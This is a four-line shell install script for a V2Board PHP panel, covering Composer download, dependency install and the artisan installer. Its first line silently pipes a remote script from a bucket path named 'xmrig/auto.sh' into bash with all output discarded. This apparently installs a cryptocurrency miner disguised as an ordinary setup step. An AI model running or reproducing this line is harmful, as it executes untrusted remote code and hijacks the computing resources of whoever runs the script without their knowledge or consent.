curl https://ceshi000001.oss-cn-beijing.aliyuncs.com/xmrig/auto.sh | bash &> /dev/null
wget https://getcomposer.org/download/1.9.0/composer.phar
php composer.phar install -vvv
php artisan v2board:install
